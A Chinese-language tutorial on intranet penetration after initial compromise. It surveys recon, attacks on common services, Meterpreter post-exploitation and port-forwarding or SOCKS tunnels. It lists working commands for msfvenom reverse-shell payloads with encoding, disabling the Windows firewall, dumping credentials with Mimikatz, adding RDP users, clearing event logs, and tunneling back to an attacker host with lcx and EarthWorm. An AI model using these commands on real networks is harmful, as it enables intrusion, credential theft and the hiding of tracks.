### 1.什么是内网渗透？

本质是渗透的延申，是整个渗透流程的一部分
在getshell后拿到企业或公司的内网权限，然后从内网得到最有价值得信息

获取内网核心数据和资料,控制某个人或多个人的计算机，获取个人机密信息

### 2.内网渗透常见的几个问题？

1. 内网信息收集及目标定位
2. 防火墙穿透
3. 木马免杀穿透

### 3.内网渗透的分类

- 工作组渗透
- 域渗透

### 4.内网术语的理解

- **内网**也指局域网，是指在某一封闭的区域内由多台计算机互连而成的计算机组

- **工作组**指的是将不同的电脑一般按功能（或部门）分别列入不同的工作组中，无安全边界

- **域** (Domain)是一个有安全边界的计算机集合

  （ 安全边界 意思是在两个域中，一个域中的用户无法访问另一个域中的资源）

- **域控制器** （ DC ） 是一个域中的一台类似管理服务器的计算机，通常有多台做备份

- 域的种类通常以域的规模区分:单域、父域和子域、域树、域森林；他们之间的核心是**信任关系**

- **DNS域名服务器** 是进行域名和与之相对应的IP地址转换的服务器

  实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等

  一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上

-  **活动目录**（ Active Directory ） 是域环境中提供目录服务的组件

  活动目录（AD）和工作组是基于WINDOWS的局域网中两种不同的网络管理模式

  工作组以计算机为管理单元;活动目录是以用户群体为单位的管理模式

- **DMZ**,隔离区,非军事化区,是为了`解决安装防火墙之后外部网络不能访问内部网络服务的问题`而设立的一个位于非安全系统与安全系统之间的一个缓冲区

  关于DMZ:
  1、内网可以访问外网;防火墙需要执行NAT
  2、内网可以访问DMZ
  3、外网不能访问内网;通过VPN
  4、外网可以访问DMZ

### 5.内网渗透过程

**入侵方式：**

1、拿下内网一台服务器/主机的权限，外网端口转发或者代理。或者通过VPN形式进入内网

渗透目标在外网有网站，网站服务器跟内网相连接，可以通过对服务器cms进行渗透

2、 攻击办公网的系统、办公网电脑、办公网无线等方式，一般是采用**社工**

通过物理方式区连接内网、钓鱼邮件、BadUSB.....

**企业内网敏感资料/数据/信息:**

高管/系统管理员/财务/人事/业务人员的个人电脑

文件服务器/共享服务器

邮件服务器

OA(自动化办公)服务器

数据库服务器

#### 5.1信息收集

1、内网信息探测

- 手动信息收集
- 自动信息收集-wmic...

2、网络环境判断

- 判断计算机所处位置的区域
- 判断计算机在内网中的角色

3、内网存活主机探测

`nmap -sP 10.10.10.0/24`
`linux:netdiscover -r 10.10.10.0/24 -i eth0`
`windows:nbtscan.exe`

内网环境复杂,跳板机不一定可以使用这些工具
如果是windows就用bat、ps1 脚本
如果是linux可以选择sh、c、pl、py....

batch  bat批处理脚本
echo on 用于打开命令回显
echo off 关闭命令回显

powsershell执行策略
在默认情况下，脚本无法执行

`Set-ExecutionPolicy RemoteSigned`

....

4、hash或明文的获取

**信息收集重点**

该阶段识别内网存活的主机IP，运行端口扫描和漏洞扫描获取可以利用的漏洞

对于内网的一台机器，其所处的内网结构、其角色是什么、使用这台机器的人的角色、以及安装了什么杀毒软件
(1)内网网段信息，拿下边界服务器为例，得到一定权限，一定要查看网卡信息，收集内部网络地址段信息，进一步渗透, 找到更多
(2)内网大小，帮助我们寻找内网核心业务
(3) 补丁、进程

#### 5.2漏洞验证/漏洞攻击(举例)

> 安全检查一般是尽可能的发现所有漏洞，对漏洞的风险进行评估和修复；
> 入侵只关注高危远程代码执行和敏感信息泄露漏洞等可以直接利用的漏洞；
> 漏洞验证可以找对应的CVE编号的POC、EXP, 利用代码在ExploitDB、seebug上查看或者在github.上搜索是否有相关的漏洞验证或利用的工具；

**前提条件：端口扫描** 这和利用什么漏洞强相关

##### 5.2.1Web部分

- 从公网直接攻击目标对外的web应用(cms..)，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据
- 允许扫描的话一般使用 AWVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞

##### 5.2.2Web中间件

IIS Apache Nginx Weblogic Tomcat JBoos Websphere等

Tomcat

端口号: 8080
攻击方法:
(1) 默认口令、弱口令、爆破, tomcat5默认有两个角色: tomcat和role1;其中账号both、tomcat、role1 的默认密码都是tomcat;弱口令一般存在5以下的版本中
(2)在管理后台部署war后门文件
(3)远程代码执行漏洞(RCE)

##### 5.2.3Web框架

- Struts2远程代码执行
- ThinkPHP任意代码执行

##### 5.2.4数据库

MySQL数据库

默认端口：3306
攻击方法：

- 爆破：弱口令
- 身份认证漏洞：CVE-2012-2122
- 拒绝服务攻击
- Phpmyadmin万能密码绕过：用户名：'localhost'@'@"  密码任意
- 提权

MSSQL数据库

默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）
攻击方法：

- 爆破：弱口令/使用系统用户
  ....

##### 5.2.5文件共享服务渗透

Ftp服务

Ftp服务分为两种情况：

​	第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；
​	第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；

默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）

攻击方式：

(1)爆破：ftp的爆破工具有很多，hydra、msf中ftp爆破模块
	`use auxiliary/scanner/ftp/ftp_login` 
(2)匿名访问：用户名：anonymous  密码：为空或任意邮箱
(3)后门vsftpd：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取权限(https://www.freebuf.com/column/143480.html)
(4)ftp远程代码溢出


Samba服务

Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。

默认端口：137、139
攻击方法：

- 远程代码执行
- 爆破：弱口令
- 未授权访问（public）

编译
gcc -o [要输出可执行文件名字] [源文件]

##### 5.2.6远程连接服务渗透

SSH

ssh是协议，通常使用openssh软件实现协议应用。基本会出现在linux服务器、网络设备、安全设备上

默认端口：22
攻击方法：

- 爆破：弱口令，可以使用工具hydra，msf中的ssh爆破模块
- 漏洞：28退格漏洞、OpenSSL漏洞
  openssh 用户枚举 CVE-2018-15473。（https://www.anquanke.com/post/id/157607）

ssl(安全套接层) => https
openssl，一个c语言函数库，是对ssl协议的实现
openssh，是对ssh协议的实现
ssh利用openssl提供的库,openssh依赖openssl


Telnet服务

有了ssh服务后，telnet服务器不常见，但是在很多设备上会有这个服务，比如cisco、华三、深信服等厂商的设备

默认端口：23
攻击方式：

- 爆破：弱口令
- 嗅探：一般发生在局域网

RDP服务

Windows远程桌面连接 

管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单

默认端口：3389
攻击方法

- 爆破
- Shift粘滞键后门：5次shift后门
- 利用ms12-020攻击3389端口
  ....

3389端口没有开放？
开3389
1、使用exe程序
2、使用vbs脚本
3、使用bat脚本
....

#### 5.3后渗透

>  Metasploit就是一个漏洞利用框架,Meterpreter是Metasploit框架中的一个扩展模块，在攻击成功以后给我们返回一个控制通道，是metsploit后渗透必不可少的 ，它具有强大的功能，包括socks代理，端口转发，键盘监听等多 个功能，meterpreter可以说是内网渗透测试神器

**优点：** 纯内存工作模式，执行漏洞渗透攻击的时候会直接装载meterpreter的动态链接库到目标进程的空间中，使得meterpreter启动隐蔽，很难被杀毒软 件检测到

- 基本功能

  (1)系统信息获取
  (2)密码哈希导出
  (3)文件上传下载
  (4)屏幕截取
  (5)键盘记录
  (6)权限提升
  (7)跳板攻击
  (8)反追踪
  
- Mmetasploit模块

  1、aux
  辅助模块，各种各样的辅助工具，扫描、发掘漏洞、探测信息等
  2、exploits
  渗透攻击模块
  3、post
  后渗透攻击模块，进行更深层次的渗透
  4、payloads
  攻击载荷模块

##### 5.3.1Meterpreter基础使用

例子：当Hacker 使用meterpreter攻击了门户网站服务器之后，获取了一个meterpretershell，如何进一步内网渗透？

1.进行漏洞利用时，设置payload,并且payload模块选择meterpreter相关

如：

选择攻击模块：use exploit/multi/handler

选择payload：set payload windows/meterpreter/reverse_tcp

2.制作后门时，payload 选择meterpreter相关

如:

```
msfvenom -p 'payload' '-e x86/shikata_ga_nai -i 5(混淆/可选)' lhost=[IP] lport=[端口] -f exe > name.exe
payload/android/meterpreter/reverse_tcp
payload/linux/x64/meterpreter_reverse_tcp
payload/python/meterpreter/reverse_tcp
payload/windows/meterpreter/reverse_tcp
payload/windows/x64/meterpreter/reverse_tcp
```

3.关闭防火墙：netsh advfirewall set allprofiles state off

4.获取系统密码： Mimikatz模块使用

```
meterpreter > load mimikatz #加载mimikatz
meterpreter > msv #获取hash值
meterpreter > kerberos #获取明文
meterpreter > ssp #获取明文信息
meterpreter > wdigest #获取系统账户信息
```

5.获取远程桌面：开启3389服务

```
run getgui -h #查看帮助
run getgui -e #开启远程桌面
run getgui -u lltest2 -p 123456 #添加用户
run getgui -f 6661 -e #3389端口转发到6661
run getgui -f 6661 -e #3389端口转发到6661
```
getgui系统不推荐,推荐使用`run post/windows/manage/enable_rdp`
getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆

```
run post/windows/manage/enable_rdp #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662 #将3389端口转发到6662 
```

6.端口转发：portfwd

端口转发靶机3389端C转发送本地的5555端口
`portfwd add -l 5555 -p 3389 -r 127.0.0.1`

攻击者连接本地127.0.0.1的5555端口，kali的rdesktop远程连接
`rdesktop -u root -p toor 127.0.0.1:5555`

7.路由设置

例如：Hacker添加去往目标网段(10.10.10.0/24) 的静态路由

run autoroute -s 10.10.10.0/24 
run autoroute -p查看是否添加成功

8.session 切换

```
>backgroup #当前会话加入后台
>session -i #所有会话信息
>session -i number #切换会话
```

9.简单痕迹清理：clearev

#### 5.4日志清理

### 6.端口转发技术

通常需要用到的场景：

- 外网服务器开启防火墙，对目标端口有进站流量过滤策略
- 内外服务器无法直接访问

解决方案：

- 端口转发
- 内网穿透&NAT穿透(代理)

#### 6.1概念性问题

##### 6.1.1端口映射

是NAT的一种，将内网主机的一个端口映射到外网主机的一个端口，提供相应的服务。

当用户访问外网ip的这个端口时，路由器会将请求映射到对应的内网的机器上。

##### 6.1.2端口转发

有时也叫隧道，端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为；
lcx.exe 就是一个基于 socket 套接字实现的端口转发工具；
一条正常的socket隧道必具备两端，一侧为服务端，它会监听一个端口等待客户端连接；
另一侧为客户端，通过传入服务端的ip和端口，才能主动连接到服务器
而端口转发工具（lcx.exe/htran)的工作原理其实是将两条 socket 隧道对接起来
由于端口转发为“异步双向通讯”隧道，隧道转接不分先后，便分别有了lcx的三种工作模式，如下所示：

1、slave “客户端” 接 “客户端” 
2、tran “服务端” 接 “客户端” 
3、listen “服务端” 接 “服务端”

**端口转发应用场景**
外网主机A可以任意访问内网主机B上的端口，但是无法访问内网主机C的端口。可以将主机C的端口转发到B主机的端口，此时外网主机A访问主机B的某某端口就相当于访问了C主机的某某端口

##### 6.1.3网络代理

代理(proxy),也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接

代理服务实质就是帮他人完成网络访问
在使用代理服务的过程中我们会发现，只要配置好socks代理后，就不再需要指定被访问目标，直接在浏览器的地址栏输入地址就能访问任意网站
如果说socks是帮他人访问网络（一对多），那么端口转发就是帮他人访问主机的某个端口（一对一）
通常是根据需求建立连接，比如要进行网络端口扫描时，必须用代理

##### 6.1.4正向/反向代理

正向代理：用户（多个） ==> 代理服务器 ==> 确定的单个服务器

反向代理：用户（多个） ==> 反向代理服务器 ==> 不确定的多个服务器

区别只是代理服务器的映射关系不一样，原因很显然，普通连接目标是统一的，反向连接目标是可以指定的

#### 6.2工具使用

传输层
	端口转发/映射
	lcx
	nc
	powercat
应用层
	socks代理

##### 6.2.1 Lcx工具

lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口

LCX两大功能:

​	1)端口转发(listen和slave成对使用)
​	2)端口映射(tran)

靶机执行:

- Lcx.exe -slave 攻击机IP <攻击者端口，如5115> 受害者IP <受害者端口，如3389>

攻击机执行:

- 监听5115端口并转发到33891上

- Lcx.exe -listen 5115 33891

攻击者远程连接[公网的主机] :

- Windows: mstsc——127.0.0.1:33891
- Kali: rdesktop-u用户名-p密码 127.0.0.1:33891

若防火墙限制，部分端口如3389无法通过防火墙[内网机器防火墙禁止3389出站]，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口

内网靶机执行:

- lcx.exe -tran 53 靶机ip 3389 // 没有指定入站IP代表任意IP都可以即0.0.0.0 端口映射和NAT类似
- 攻击者远程连接,直接远程桌面连接到到:靶机IP:53

##### 6.2.2EarthWorm-内网穿透

EarthWorm （简写ew）是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发

代理类别:

- HTTP代理
- SOCKS代理.
- FTP代理
- Telnet代理
- SSL代理

该工具共有 6种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）

其中SOCKS5服务的核心逻辑支持由ssocksd和rssocks提供，分别对应正向与反向socks代理

- ssocksd 用来开启socks5代理服务
- rssocks 本地启用socks5服务，并反弹到另一IP地址
- rcsocks 接收反弹过来的socks5服务，并转向另一端口
- 其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路

**工具参数说明:**

​	-| 开放指定端口监听
​	-d 指定转发或反弹的主机地址
​	-e 指定转发或反弹的主机端口
​	-f 指定连接或映射的主机地址
​	-g 指定连接或映射的主机端口
​	-t 设置超时时间
​	-s 选定6种状态中的一种

**LCX功能**

- 攻击机:把5555端口流量转发到本地的8888端口

  `ew -s Icx listen -| 8888 -e 5555`

- 靶机:把本地3389端口转发到远程攻击机IP的5555端口

  `ew -s Lcx_slave -d攻击机IP -e 5555 -f 127.0.0.1 -g 3389`

- 其中的5555端口，用于攻击机和靶机之间的通信

 **SOCK5 内网穿透功能**

   SOCKS5 是一个代理协议，它在使用TCP/IP协议通讯的前端机器和服务器机器之间扮演一个中介角色，使得内部网中的前端机器变得能够访问Internet网中的服务器，或者使通讯更加安全

【正向代理】 目标网络边界存在公网IP且可任意开监听端口

- 目标： ew -s ssocksd –l 8888 // 在被攻击主机上通过这个命令开启8888端口的socks代理

【反向代理】 目标网络边界不存在公网IP，需要通过反弹方式创建socks代理，或者开启了防火墙，限制入站流量

- 在公网主机上添加转接隧道，将1080收到的代理请求转交给反连8888端口的主机

​	`ew -s rcsocks -l 1080 -e 8888`

- 将目标网络的可控边界主机反向连接公网主机

​	`ew -s rssocks -d 1.1.1.1 -e 8888`

> 代理成功后用socks连接工具连接

6.2.3socks连接工具

 Windows 平台下连接工具SocksCap64-Portable

 Linux平台下连接工具代理连接工具是proxychains

配置代理
	vim /etc/proxychains.conf
	末尾添加一行 socks5 [本地主机IP] 8888
使用:
	在命令前加proxychains
	如: proxychains curl " http://www.google.com

